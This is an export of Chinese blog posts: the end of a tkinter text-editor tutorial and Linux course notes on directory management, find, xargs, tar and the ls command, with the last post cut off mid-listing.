<pre class="line-numbers language-python" data-language="python"><code class="language-python">btn_open <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>win<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'打开'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>do_open<span class="token punctuation">)</span>  <span class="token comment"># 创建按钮用于打开文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们给创建按钮的tkinter.Button函数（<em>实际上这不是函数</em>），传递了一个参数<code>command=do_open</code>，该参数用于设置当按钮被点击时自动调用的函数，所以我们的重点就是实现这个当点击时自动调用的do_open函数。</p>
<p>打开文件的流程是怎么样的呢？</p>
<ol>
<li>首先，我们要知道文件的路径，先从文本输入框输入文件的路径</li>
<li>点击打开按钮</li>
<li>点击打开按钮幕后将文件打开，读取文件内容，把文件内容显示d奥多行文本框中</li>
</ol>
<p>其实我们的do_open函数就是上面的第三步，打开文件=&gt;读取数据=&gt;显示数据</p>
<p>具体代码如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">do_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 打开文件</span>
    file_path <span class="token operator">=</span> entry_file<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取文本框的内容</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span> <span class="token keyword">as</span> fr<span class="token punctuation">:</span>
        <span class="token comment"># 打开文件</span>
        content <span class="token operator">=</span> fr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#一次性读取文件内容，对大文件不宜使用</span>
        text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># 清空文本框内容</span>
        text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> content<span class="token punctuation">)</span>  <span class="token comment"># 在光标后插入内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先我们通过<code>file_path = entry_file.get()</code>获取到了文本输入框的内容作为文件的路径，用with代码块打开文件，读取文件数据后，将数据插入到多行文本框显示。</p>
<p>在插入数据之前，先使用<code>text.delete(0.0, tkinter.END)</code>清空文本框，这里就不多解释了。具体用法可以自己查查。</p>
<p>示例如下（这里我打开了python源码文件本身）：<br><img src="/images/a5aecc96/2.png" alt="打开文件"></p>
<h4 id="第三步——保存文件"><a href="#第三步——保存文件" class="headerlink" title="第三步——保存文件"></a>第三步——保存文件</h4><p>保存文件的功能实现类似打开文件，点击保存按钮后：获取多行文本框内容=&gt;打开文件=&gt;写入文件</p>
<p>话不多说，上代码！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">do_save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 保存文件</span>
    content <span class="token operator">=</span> text<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># 获取文本框内容</span>
    file_path <span class="token operator">=</span> entry_file<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 文件路径</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fw<span class="token punctuation">:</span>
        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>  <span class="token comment"># 写入数据到文件中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>gif动图演示：<br><img src="/images/a5aecc96/3.gif" alt="保存文件"></p>
<p>首先我在多行文本框中输入了<code>abcdefghijk</code>，在文本输入框输入文件路径<code>1.txt</code>，然后点击保存。</p>
<p>之后把多行文本框的内容都删掉，再打开1.txt文件，可以看到刚刚输入的<code>abcdefghijk</code>内容，浏览目录也可以发现，当前目录下确实多了一个1.txt文件，可以用记事本查看，文件确实保存成功！</p>
<h4 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h4><p>现贴出完整的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter
<span class="token comment"># 导入tkinter库</span>


win <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建窗口</span>
win<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'文本编辑器'</span><span class="token punctuation">)</span>  <span class="token comment"># 设置标题</span>

entry_file <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Entry<span class="token punctuation">(</span>win<span class="token punctuation">)</span>  <span class="token comment"># 创建一个文本输入框</span>
entry_file<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 放置该输入框</span>

<span class="token keyword">def</span> <span class="token function">do_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 打开文件</span>
    file_path <span class="token operator">=</span> entry_file<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取文本框的内容</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span> <span class="token keyword">as</span> fr<span class="token punctuation">:</span>
        <span class="token comment"># 打开文件</span>
        content <span class="token operator">=</span> fr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#一次性读取文件内容，对大文件不宜使用</span>
        text<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># 清空文本框内容</span>
        text<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>tkinter<span class="token punctuation">.</span>END<span class="token punctuation">,</span> content<span class="token punctuation">)</span>  <span class="token comment"># 在光标后插入内容</span>

<span class="token keyword">def</span> <span class="token function">do_save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 保存文件</span>
    content <span class="token operator">=</span> text<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span> tkinter<span class="token punctuation">.</span>END<span class="token punctuation">)</span>  <span class="token comment"># 获取文本框内容</span>
    file_path <span class="token operator">=</span> entry_file<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 文件路径</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fw<span class="token punctuation">:</span>
        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>



btn_open <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>win<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'打开'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>do_open<span class="token punctuation">)</span>  <span class="token comment"># 创建按钮用于打开文件</span>
btn_save <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>win<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">'保存'</span><span class="token punctuation">,</span> command<span class="token operator">=</span>do_save<span class="token punctuation">)</span>  <span class="token comment"># 创建按钮用于保存文件</span>

<span class="token comment"># 放置按钮</span>
btn_open<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>
btn_save<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># 创建多行文本框，用于编辑文件</span>
text <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>win<span class="token punctuation">)</span>
text<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span> 

win<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 进入消息循环</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个小工具很简单（也很丑 <code>(￣_,￣ )</code>），但也将文件读写的知识应用到了实际。</p>
<p>如果大家对tkinter有兴趣的话，可以自己搜索学习，相信大家能做出有趣的程序来。</p>
]]></content>
      <categories>
        <category>python教程</category>
        <category>python小项目</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第四周·文件管理和目录管理（二）</title>
    <url>/3892d071/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文整理了Linux文件与目录的管理相关知识</p>
<span id="more"></span>

<h3 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h3><h4 id="和"><a href="#和" class="headerlink" title=".和.."></a><code>.</code>和<code>..</code></h4><p>每个目录下都必有两个文件，<code>.</code>和<code>..</code>，它们分别代表着当前目录和上级目录，这两个目录由系统创建和删除</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -a
<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="主目录"><a href="#主目录" class="headerlink" title="主目录"></a>主目录</h4><p>每个用户都有自己独立的目录，一般是<code>/home/用户名</code>，可以用env命令查看环境变量HOME的值来看当前用户的主目录路径。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">env</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token environment constant">HOME</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/home/featherm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>大多数的shell都会把符号<code>~</code>解释成主目录的路径，所以可以用<code>~</code>代替主目录，但是要注意的是，但是<code>~</code>只是shell解释的，编写程序涉及路径的时候，最好不要用<code>~</code>，因为所用的程序函数不一定支持<code>~</code>的解释。</p>
<h4 id="绝对路径和相对路径"><a href="#绝对路径和相对路径" class="headerlink" title="绝对路径和相对路径"></a>绝对路径和相对路径</h4><p>路径分隔符使用的是<code>/</code>（不同于Windows用<code>\</code>），以根目录<code>/</code>开头的路径为<strong>绝对路径</strong>，如<code>/home/featherm</code>；否则为<strong>相对路径</strong>，相对路径是指相对于当前目录的路径，如：当前目录下有一文件1.txt，则路径<code>1.txt</code>指的是当前目录下的1.txt</p>
<h4 id="当前工作目录"><a href="#当前工作目录" class="headerlink" title="当前工作目录"></a>当前工作目录</h4><p>当前工作目录是进程属性的一部分，每个进程都有</p>
<p>在shell中可以用pwd命令打印当前工作目录：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token builtin class-name">pwd</span>        
/home/featherm/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可用cd命令改变当前工作目录，如切换到根目录：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token builtin class-name">cd</span> /
$ <span class="token builtin class-name">pwd</span>
/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>若不传递参数，则回到主目录：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token builtin class-name">cd</span> 
$ <span class="token builtin class-name">pwd</span>
/home/featherm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><em>cd是shell的一个内部命令，功能由shell完成</em></p>
<h4 id="创建-删除目录"><a href="#创建-删除目录" class="headerlink" title="创建/删除目录"></a>创建/删除目录</h4><p>创建目录用命令mkdir，如下创建tmp目录：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mkdir</span> tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>添加选项-p，可自动创建路径中不存在的目录，如：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">mkdir</span> -p database/2019/6/17/log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除目录用命令rmdir：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">rmdir</span> tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用rmdir时，被删除的目录必须是空的，如果想删除非空目录，可以使用前一篇文章中介绍的<code>rm -r dir</code></p>
<h4 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h4><p>前一篇文章已经介绍了，使用cp命令，添加-r选项即可：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cp</span> -r dir1 dir2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="cp的其它常用选项"><a href="#cp的其它常用选项" class="headerlink" title="cp的其它常用选项"></a>cp的其它常用选项</h5><h5 id="冗长模式"><a href="#冗长模式" class="headerlink" title="冗长模式"></a>冗长模式</h5><p>选项-v，冗长（Verbose）模式：可以实时列出正在复制的n文件</p>
<h6 id="增量拷贝"><a href="#增量拷贝" class="headerlink" title="增量拷贝"></a>增量拷贝</h6><p>选项-u，增量拷贝（Update），一般用于备份目录。可根据文件的时间戳，不拷贝相同的或者过时的版本的文件，以提高速度。</p>
<p><em>命令touch可将文件最后一次修改时间设置为当前时间，但不修改文件的内容，如<code>touch 1.txt</code></em></p>
<p>关于增量拷贝，Linux下还有一款工具：rsync，该工具可以远程同步目录，具体用法查看man手册：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">man</span> <span class="token function">rsync</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>目录遍历主要用到命令find，该命令从指定的<em>查找范围<em>开始，递归地查找子目录，对满足</em>条件<em>的文件或目录，执行指定的</em>动作</em></p>
<p>例：<br><code>find ver1.d ver2.d -name &#39;*.c&#39; -print</code></p>
<ul>
<li>范围：目录ver1.d和目录ver2.d</li>
<li>条件：与名字<code>*.c</code>匹配</li>
<li>动作：把查找到的文件的路径名打印出来</li>
</ul>
<h5 id="条件选项"><a href="#条件选项" class="headerlink" title="条件选项"></a>条件选项</h5><h6 id="name-wildcard"><a href="#name-wildcard" class="headerlink" title="-name wildcard"></a>-name wildcard</h6><ul>
<li>文件名与wildcard匹配（wildcard的中文意识是通配符）</li>
<li>通配符的解释由find完成，所以wildcard两边要有引号，否则通配符会被shell展开</li>
<li>文件名指路径名的最后一部分</li>
</ul>
<h6 id="regex-pattern"><a href="#regex-pattern" class="headerlink" title="-regex pattern"></a>-regex pattern</h6><p><strong>整个路径名</strong>与正则表达式pattern匹配</p>
<h6 id="type"><a href="#type" class="headerlink" title="-type"></a>-type</h6><ul>
<li>f 普通文件</li>
<li>d 目录</li>
<li>l 符号连接文件</li>
<li>c 字符设备文件</li>
<li>b 块设备文件</li>
<li>p 管道文件</li>
</ul>
<p>例如，打印tmp目录下的所有文件：<code>find tmp -type f -print</code></p>
<h6 id="size-n单位"><a href="#size-n单位" class="headerlink" title="-size +/- n单位"></a>-size +/- n单位</h6><p>指定文件大小，单位有c（字符），b（块，512字节），k，M，G，<strong>默认为b</strong><br>如：大于10M：<code>+10M</code>、小于10M：<code>-10M</code>、等于10M：<code>10M</code></p>
<h6 id="mtime-ndays"><a href="#mtime-ndays" class="headerlink" title="-mtime +/- ndays"></a>-mtime +/- ndays</h6><p>文件的最近修改时间离现在有多少天</p>
<h6 id="newer-file"><a href="#newer-file" class="headerlink" title="-newer file"></a>-newer file</h6><p>所匹配文件最近修改时间比file要晚，也就是所匹配的文件要比file新</p>
<h6 id="其它条件选项"><a href="#其它条件选项" class="headerlink" title="其它条件选项"></a>其它条件选项</h6><ul>
<li>-user 指定文件主（所属用户）</li>
<li>-nouser 文件的所属用户已经不存在（被删除）</li>
<li>-group 文件所属用户的组</li>
<li>…</li>
</ul>
<p>其余可查阅man手册</p>
<h6 id="复合条件"><a href="#复合条件" class="headerlink" title="复合条件"></a>复合条件</h6><p>可以用<code>()</code>、<code>-o</code>、<code>!</code>表示条件的“与（且）”、“或”、“非”</p>
<hr>
<h5 id="动作选项"><a href="#动作选项" class="headerlink" title="动作选项"></a>动作选项</h5><h6 id="print"><a href="#print" class="headerlink" title="-print"></a>-print</h6><p>打印匹配的文件的路径名</p>
<h6 id="exec"><a href="#exec" class="headerlink" title="-exec"></a>-exec</h6><p>对匹配的目标执行一条命令。在-exec及随后分号之间的内容作为一条命令</p>
<h6 id="ok"><a href="#ok" class="headerlink" title="-ok"></a>-ok</h6><p>与-exec类似，但每一条命令执行前需操作员确认</p>
<hr>
<p><strong>注意</strong>：动作也可以有多个</p>
<h5 id="目录遍历举例"><a href="#目录遍历举例" class="headerlink" title="目录遍历举例"></a>目录遍历举例</h5><ul>
<li><code>find . type -d -print</code> 从当前目录开始，打印所有目录路径</li>
<li><code>find / -name &#39;stud*&#39; -type d -print</code> 打印名字与<code>stud*</code>匹配，<em>且</em>为目录的路径</li>
<li><code>find / -type f -mtime -10 -print</code> 查找根目录下最近10天内修改过的普通磁盘文件</li>
<li><code>find . ! -type -d -links +2 -print</code> 从当前目录开始查找link数大于2的非目录文件</li>
<li><code>find～ -size +100k &#39;(&#39; -name core -o -name &#39;*.tmp&#39; &#39;)&#39; -print</code> 从主目录开始查找大于100KB的名叫core <em>或者</em> 有.tmp后缀的文件或目录等</li>
<li><code>find ~ -size +100k \( -name core -o -name &#39;*.tmp&#39; \) -print</code> 同上</li>
<li><code>find /lib /usr -name &#39;libc*.so&#39; -exec ls -lh &#123;&#125; \;</code> 对匹配条件的路径执行ls命令，其中的<code>&#123;&#125;</code>代表匹配的路径</li>
<li><code>find src -name &#39;*.c&#39; -exec grep -n -- --help &#123;&#125; /dev/null \;</code> 搜索src目录下的匹配<code>*.c</code>的文件，并用grep搜索文件中的字符串<code>--help</code>，显示出行号（-n选项）。由于grep命令操作一个文件时，不显示文件名，故加上一个“虚拟的”文件<code>/dev/null</code>（该文件是一个特殊的设备文件，读取不到数据，是空的，写入什么数据都被丢弃）</li>
</ul>
<h5 id="xargs命令"><a href="#xargs命令" class="headerlink" title="xargs命令"></a>xargs命令</h5><p>上面最后一个例子的效率特别低，因为每匹配到一个路径，都要创建一个进程来执行grep命令。<br>可以结合xargs命令提高效率，高效率的方法应该如下：<br><code>find src -name &#39;*.c&#39; -print | xargs grep -n -- --help</code></p>
<p>xargs命令会把标准输入追加到它的第一个参数（grep）后面，再作为一个命令执行。</p>
<p>如果标准输入的数据量很大，xargs指定的处理程序会启动多个进程进行，每个进程处理一批，一般是几千个参数（命令行参数占满128K字节）。可以用-n选项指定每批处理最多多少个参数</p>
<p>xargs常用场景：</p>
<ul>
<li>shell通配符展开，超出缓冲区空间大小而失败<br>  <code>rm -f *.dat</code> 文件名<code>*.dat</code>展开失败，文件过多，超出缓冲区空间大小，可用xargs改造：<br>  <code>ls | grep &quot;.dat$&quot; | xargs rm -f</code></li>
<li>find命中目录名因删除目录导致影响目录遍历过程<br>  <code>find . -name CVS -exec rm -rf &#123;&#125; \;</code> 改为：<code>find . -name CVS -print | xargs rm -rf</code></li>
</ul>
<hr>
<h3 id="打包和压缩"><a href="#打包和压缩" class="headerlink" title="打包和压缩"></a>打包和压缩</h3><p>tar最早为顺序访问的i磁带机设备而设计（Tape ARchive 磁带归档），用于保留和恢复磁带上的文件，可用来打包和压缩文件</p>
<p>用法：<code>tar ctxv[f device] file-list</code><br>第一个字母选项指定功能，必须指定，有以下三个：</p>
<ul>
<li>c 创建（Create）新磁带，从头开始写，以前存于磁带上的数据会被覆盖掉</li>
<li>t 列表（Table），列出磁带上的文件名列表，当不指定文件名时，将列出所有的文件</li>
<li>x 抽取（eXtract），从磁带中抽取指定文件，当不指定文件名时，抽取所有文件<br>其他选项：</li>
<li>v 冗长（Verbose），每处理一个文件就打印文件的名字，并在文件名前冠以功能字母</li>
<li>f File，指定设备文件名</li>
<li>z 采用压缩格式（gzip算法）</li>
<li>j 采用压缩格式（bzip2算法）</li>
</ul>
<p>常用方法：</p>
<ul>
<li>打包文件：<code>tar cvf my.tar *.[ch] makefile</code></li>
<li>打包work目录：<code>tar cvf work.tar work</code></li>
<li>用gizp压缩算法打包work目录：<code>tar cvzf work.tar.gz work</code> （文件名的后缀只是惯例，无强制要求）</li>
<li>恢复work目录：<code>tar xvf work.tar.gz</code></li>
</ul>
<p>gzip算法的执行速度快，但压缩比率不如bzip2；bzip2执行速度要不gzip慢很多，压缩比率较好</p>
]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第四周·文件管理和目录管理（一）</title>
    <url>/8843ca9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文整理了Linux文件与目录的管理相关知识</p>
<span id="more"></span>

<h3 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h3><p>ls命令用于列出目录下的文件与目录</p>
<h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ul>
<li>不加任何参数，列出当前目录下的所有文件和目录，如：  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span>
<span class="token number">1</span>.txt  <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>参数为文件时，列出文件，如：  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> <span class="token number">1</span>.txt
<span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>参数为目录时，列出目录下的所有文件和目录，如：  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ tmp <span class="token function">ls</span> <span class="token function">dir</span> 
<span class="token number">2</span>.txt  <span class="token number">3</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

</li>
</ul>
<hr>
<h4 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h4><h5 id="选项-F（flag）"><a href="#选项-F（flag）" class="headerlink" title="选项-F（flag）"></a>选项-F（flag）</h5><p>目录后加<code>/</code>，可执行文件后加<code>*</code>，符号链接文件后加<code>@</code>，普通文件后无任何标记，如：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$ls</span> / -F
bin@   dev/  home/  lib64@       mnt/  proc/  run/   srv/  System/  usr/
boot/  etc/  lib@   lost+found/  opt/  root/  sbin@  sys/  tmp/     var/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h5 id="长格式列表-l"><a href="#长格式列表-l" class="headerlink" title="长格式列表-l"></a>长格式列表-l</h5><p>看下面例子：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -l   
总用量 <span class="token number">4</span>
-rw-r--r-- <span class="token number">1</span> featherm featherm    <span class="token number">0</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">22</span>:30 <span class="token number">1</span>.txt
drwxr-xr-x <span class="token number">2</span> featherm featherm <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">22</span>:34 <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>第1列：前面10个字符代表的意义如下：</p>
<ul>
<li>第1个字符 <code>-</code>=&gt;普通文件，<code>b</code>=&gt;块设备文件（Block），<code>d</code>=&gt;目录文件（Dir），<code>l</code>=&gt;符号连接文件（Link），<code>c</code>=&gt;字符设备文件（Char），<code>p</code>=&gt;命名管道文件（Pipe）</li>
<li>文件的访问权限：r（Read）=&gt;读权限，w（Write）=&gt;写权限，x（eXecutable）=&gt;可执行权限<ul>
<li>2-4字符：文件所有者对文件的访问权限</li>
<li>5-7字符：同组用户对文件的访问权限</li>
<li>8-10字符：其它用户对文件的访问权限</li>
</ul>
</li>
</ul>
<p>第2列：文件的link数，涉及到此文件的目录项数</p>
<p>第3，4列：文件主的名字和组名</p>
<p>第5列：</p>
<ul>
<li>普通磁盘文件：文件大小（单位为字节）</li>
<li>目录：目录项的数目</li>
<li>符号连接文件：符号连接文件自身的大小</li>
<li>字符设备和块设备文件：主设备号和次设备号</li>
<li>管道文件：管道内数据的长度</li>
</ul>
<p>第6-8列：文件最后一次被修改的日期和时间+ 符号连接文件：符号连接文件自身的大小</p>
<ul>
<li>字符设备和块设备文件：主设备号和次设备号</li>
<li>管道文件：管道内数据的长度</li>
</ul>
<p>最后一列：文件名或目录名，对于符号连接文件附带连接文件的内容</p>
<h5 id="选项-h"><a href="#选项-h" class="headerlink" title="选项 -h"></a>选项 -h</h5><p>以便于人阅读的方式打印数值，如文件大小1K，123M，1G等</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -l -h 
总用量 <span class="token number">4</span>.0K
-rw-r--r-- <span class="token number">1</span> featherm featherm    <span class="token number">0</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">22</span>:30 <span class="token number">1</span>.txt
drwxr-xr-x <span class="token number">2</span> featherm featherm <span class="token number">4</span>.0K  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">22</span>:34 <span class="token function">dir</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="选项-d"><a href="#选项-d" class="headerlink" title="选项-d"></a>选项-d</h5><p>当ls的参数是目时，不列出目录下的项目，而是列出目录本身的信息</p>
<p>不加-d选项：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -l /
总用量 <span class="token number">56</span>
lrwxrwxrwx   <span class="token number">1</span> root root     <span class="token number">7</span>  <span class="token number">9</span>月 <span class="token number">30</span>  <span class="token number">2018</span> bin -<span class="token operator">></span> usr/bin
drwxr-xr-x   <span class="token number">4</span> root root  <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">12</span> <span class="token number">13</span>:32 boot
drwxr-xr-x  <span class="token number">20</span> root root  <span class="token number">3480</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">21</span>:48 dev
drwxr-xr-x  <span class="token number">94</span> root root  <span class="token number">4096</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">21</span>:34 etc
drwxr-xr-x   <span class="token number">4</span> root root  <span class="token number">4096</span>  <span class="token number">4</span>月 <span class="token number">20</span> <span class="token number">13</span>:42 home
lrwxrwxrwx   <span class="token number">1</span> root root     <span class="token number">7</span>  <span class="token number">9</span>月 <span class="token number">30</span>  <span class="token number">2018</span> lib -<span class="token operator">></span> usr/lib
lrwxrwxrwx   <span class="token number">1</span> root root     <span class="token number">7</span>  <span class="token number">9</span>月 <span class="token number">30</span>  <span class="token number">2018</span> lib64 -<span class="token operator">></span> usr/lib
drwx------   <span class="token number">2</span> root root <span class="token number">16384</span>  <span class="token number">4</span>月 <span class="token number">20</span> <span class="token number">13</span>:21 lost+found
drwxr-xr-x   <span class="token number">2</span> root root  <span class="token number">4096</span>  <span class="token number">9</span>月 <span class="token number">30</span>  <span class="token number">2018</span> mnt
drwxr-xr-x   <span class="token number">6</span> root root  <span class="token number">4096</span>  <span class="token number">5</span>月 <span class="token number">26</span> <span class="token number">13</span>:54 opt
dr-xr-xr-x <span class="token number">172</span> root root     <span class="token number">0</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">21</span>:34 proc
drwxr-xr-x   <span class="token number">7</span> root root  <span class="token number">4096</span>  <span class="token number">5</span>月  <span class="token number">1</span> <span class="token number">16</span>:48 root
drwxr-xr-x  <span class="token number">25</span> root root   <span class="token number">660</span>  <span class="token number">6</span>月 <span class="token number">16</span> <span class="token number">21</span>:35 run
